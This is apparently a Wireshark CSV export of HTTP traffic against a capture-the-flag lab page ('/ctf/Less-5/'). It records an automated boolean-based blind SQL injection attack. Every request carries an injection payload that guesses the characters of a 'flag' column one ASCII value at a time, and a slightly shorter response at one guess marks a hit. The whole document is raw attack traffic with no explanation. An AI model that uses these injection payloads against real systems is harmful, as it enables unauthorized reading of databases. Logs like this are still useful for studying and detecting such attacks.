"No.","Time","Source","Destination","Protocol","Length","Info"
"2207","2.045361079","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2216","2.047570351","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=71--+ HTTP/1.1 "
"2219","2.049588726","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2228","2.051974203","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=72--+ HTTP/1.1 "
"2231","2.054132129","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2240","2.056305320","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=73--+ HTTP/1.1 "
"2243","2.058316097","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2252","2.060820566","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=74--+ HTTP/1.1 "
"2255","2.062946422","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2264","2.065432889","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=75--+ HTTP/1.1 "
"2267","2.067528797","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2276","2.070102349","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=76--+ HTTP/1.1 "
"2279","2.072353259","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2288","2.074878088","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=77--+ HTTP/1.1 "
"2291","2.077142577","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2300","2.079721878","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=78--+ HTTP/1.1 "
"2303","2.082022697","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2312","2.084325036","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=79--+ HTTP/1.1 "
"2315","2.086442304","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2324","2.088809299","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=80--+ HTTP/1.1 "
"2327","2.091063836","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2336","2.093430127","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=81--+ HTTP/1.1 "
"2339","2.095698115","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2348","2.098237801","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=82--+ HTTP/1.1 "
"2351","2.100301499","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2360","2.102772528","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=83--+ HTTP/1.1 "
"2363","2.105051403","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2372","2.107444992","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=84--+ HTTP/1.1 "
"2375","2.109695711","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2384","2.112317128","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=85--+ HTTP/1.1 "
"2387","2.114404681","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2396","2.116657157","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=86--+ HTTP/1.1 "
"2399","2.118217872","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2408","2.120923298","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=87--+ HTTP/1.1 "
"2411","2.122983087","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2420","2.125411654","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=88--+ HTTP/1.1 "
"2423","2.127446769","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2432","2.130031258","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=89--+ HTTP/1.1 "
"2435","2.132283043","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2444","2.134919464","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=90--+ HTTP/1.1 "
"2447","2.137041676","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2456","2.139535848","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=91--+ HTTP/1.1 "
"2459","2.141749360","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2468","2.144331645","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=92--+ HTTP/1.1 "
"2471","2.146565888","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2480","2.148879529","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=93--+ HTTP/1.1 "
"2483","2.150582005","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2492","2.153171146","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=94--+ HTTP/1.1 "
"2495","2.155181747","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2504","2.157425138","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=95--+ HTTP/1.1 "
"2507","2.159436575","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2516","2.161720245","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=96--+ HTTP/1.1 "
"2519","2.163936893","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2528","2.166418995","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),3,1))=97--+ HTTP/1.1 "
"2531","2.168678554","192.168.246.1","192.168.246.23","HTTP","978","HTTP/1.1 200 OK  (text/html)"
"2540","2.171149669","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=33--+ HTTP/1.1 "
"2543","2.173384778","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2552","2.175598264","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=34--+ HTTP/1.1 "
"2555","2.177715474","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2565","2.182812358","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=35--+ HTTP/1.1 "
"2567","2.184889547","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2576","2.187296726","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=36--+ HTTP/1.1 "
"2579","2.189368633","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2588","2.191989605","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=37--+ HTTP/1.1 "
"2591","2.195794918","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2600","2.198317906","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=38--+ HTTP/1.1 "
"2603","2.200333525","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2612","2.203141922","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=39--+ HTTP/1.1 "
"2615","2.205672798","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2624","2.208155366","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=40--+ HTTP/1.1 "
"2627","2.210416959","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2636","2.212650753","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=41--+ HTTP/1.1 "
"2639","2.214865212","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2648","2.217479710","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=42--+ HTTP/1.1 "
"2651","2.219945486","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2660","2.222551977","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=43--+ HTTP/1.1 "
"2663","2.224803263","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2672","2.227499198","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=44--+ HTTP/1.1 "
"2675","2.230162731","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2684","2.232615466","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=45--+ HTTP/1.1 "
"2687","2.235181258","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2696","2.237534496","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=46--+ HTTP/1.1 "
"2699","2.240064848","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2708","2.242380256","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=47--+ HTTP/1.1 "
"2711","2.244592706","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2720","2.247217300","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=48--+ HTTP/1.1 "
"2723","2.249283356","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2732","2.251592521","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=49--+ HTTP/1.1 "
"2735","2.253919578","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2744","2.256462064","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=50--+ HTTP/1.1 "
"2747","2.258680286","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2756","2.261153675","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=51--+ HTTP/1.1 "
"2759","2.263249445","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2768","2.265404566","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=52--+ HTTP/1.1 "
"2771","2.267722393","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2780","2.270166211","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=53--+ HTTP/1.1 "
"2783","2.272716669","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2792","2.274900711","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=54--+ HTTP/1.1 "
"2795","2.277070604","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2804","2.279779197","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=55--+ HTTP/1.1 "
"2807","2.281983080","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2816","2.284298368","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=56--+ HTTP/1.1 "
"2819","2.286636583","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2828","2.290439302","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=57--+ HTTP/1.1 "
"2831","2.292713108","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2840","2.295185972","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=58--+ HTTP/1.1 "
"2843","2.297415932","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2852","2.299782881","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=59--+ HTTP/1.1 "
"2855","2.302050583","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2864","2.304274252","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=60--+ HTTP/1.1 "
"2867","2.306359991","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2876","2.308940355","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=61--+ HTTP/1.1 "
"2879","2.311345527","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2888","2.313958921","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=62--+ HTTP/1.1 "
"2891","2.316089503","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2900","2.318411202","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=63--+ HTTP/1.1 "
"2903","2.320503512","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2912","2.323181698","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=64--+ HTTP/1.1 "
"2915","2.325272083","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2924","2.327878431","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=65--+ HTTP/1.1 "
"2927","2.329929144","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2936","2.332132615","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=66--+ HTTP/1.1 "
"2939","2.334190501","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2948","2.336122007","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=67--+ HTTP/1.1 "
"2951","2.338484668","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2960","2.340744030","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=68--+ HTTP/1.1 "
"2963","2.343066309","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2972","2.345666952","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=69--+ HTTP/1.1 "
"2975","2.347749927","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2984","2.350293805","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=70--+ HTTP/1.1 "
"2987","2.352704213","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"2996","2.355259176","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=71--+ HTTP/1.1 "
"2999","2.357544219","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3008","2.359854108","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=72--+ HTTP/1.1 "
"3011","2.361868921","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3020","2.364202594","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=73--+ HTTP/1.1 "
"3023","2.366224587","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3032","2.368774551","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=74--+ HTTP/1.1 "
"3035","2.371079657","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3044","2.373687748","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=75--+ HTTP/1.1 "
"3047","2.375793131","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3056","2.378093696","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=76--+ HTTP/1.1 "
"3059","2.380142246","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3068","2.381828319","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=77--+ HTTP/1.1 "
"3071","2.384096480","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3080","2.386597097","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=78--+ HTTP/1.1 "
"3083","2.388707220","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3092","2.391061010","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=79--+ HTTP/1.1 "
"3095","2.393238868","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3104","2.395860114","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=80--+ HTTP/1.1 "
"3107","2.398070243","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3116","2.400447380","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=81--+ HTTP/1.1 "
"3119","2.402734556","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3128","2.405312586","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=82--+ HTTP/1.1 "
"3131","2.407594652","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3140","2.409958135","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=83--+ HTTP/1.1 "
"3143","2.412301305","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3152","2.414709940","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=84--+ HTTP/1.1 "
"3155","2.416961464","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3164","2.419560863","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=85--+ HTTP/1.1 "
"3167","2.421615704","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3176","2.424068835","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=86--+ HTTP/1.1 "
"3179","2.426314581","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3188","2.428902178","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=87--+ HTTP/1.1 "
"3191","2.431125741","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3200","2.433553253","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=88--+ HTTP/1.1 "
"3203","2.435575788","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3212","2.437979290","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=89--+ HTTP/1.1 "
"3215","2.440304847","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3224","2.442958233","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=90--+ HTTP/1.1 "
"3227","2.445071624","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3236","2.447512976","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=91--+ HTTP/1.1 "
"3239","2.449565350","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3248","2.452165786","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=92--+ HTTP/1.1 "
"3251","2.454239809","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3260","2.456481700","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=93--+ HTTP/1.1 "
"3263","2.458564232","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3272","2.461001106","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=94--+ HTTP/1.1 "
"3275","2.463027798","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3284","2.465129588","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=95--+ HTTP/1.1 "
"3287","2.467289296","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3296","2.469591733","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=96--+ HTTP/1.1 "
"3299","2.471639927","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3308","2.474138682","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=97--+ HTTP/1.1 "
"3311","2.476143481","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3320","2.478543081","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=98--+ HTTP/1.1 "
"3323","2.480633654","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
"3332","2.483056649","192.168.246.23","192.168.246.1","HTTP","287","GET /ctf/Less-5/?id=1'%20and%20ascii(substr((select%20flag%20from%20t),4,1))=99--+ HTTP/1.1 "
"3335","2.485076708","192.168.246.1","192.168.246.23","HTTP","994","HTTP/1.1 200 OK  (text/html)"
